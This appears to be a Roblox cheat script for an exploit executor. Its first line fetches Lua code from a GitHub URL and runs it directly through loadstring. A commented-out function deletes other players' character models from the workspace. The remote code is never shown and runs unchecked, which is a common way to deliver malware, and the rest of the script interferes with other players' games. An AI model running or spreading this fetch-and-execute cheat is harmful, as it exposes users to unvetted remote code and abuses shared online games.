loadstring(game:HttpGet("https://github.com/KhSaeed90/Roblox/raw/workspace/5777228223"))()

--[[
-- execute this to remove players character around the chaos flower
function getLag()
    for i, v in next, workspace:GetChildren() do
        for i, p in next, game.Players:GetChildren() do
            if p ~= game.Players.LocalPlayer and p.Name == v.Name then
                v:Destroy()
            end
        end
    end
end
getLag()
]]--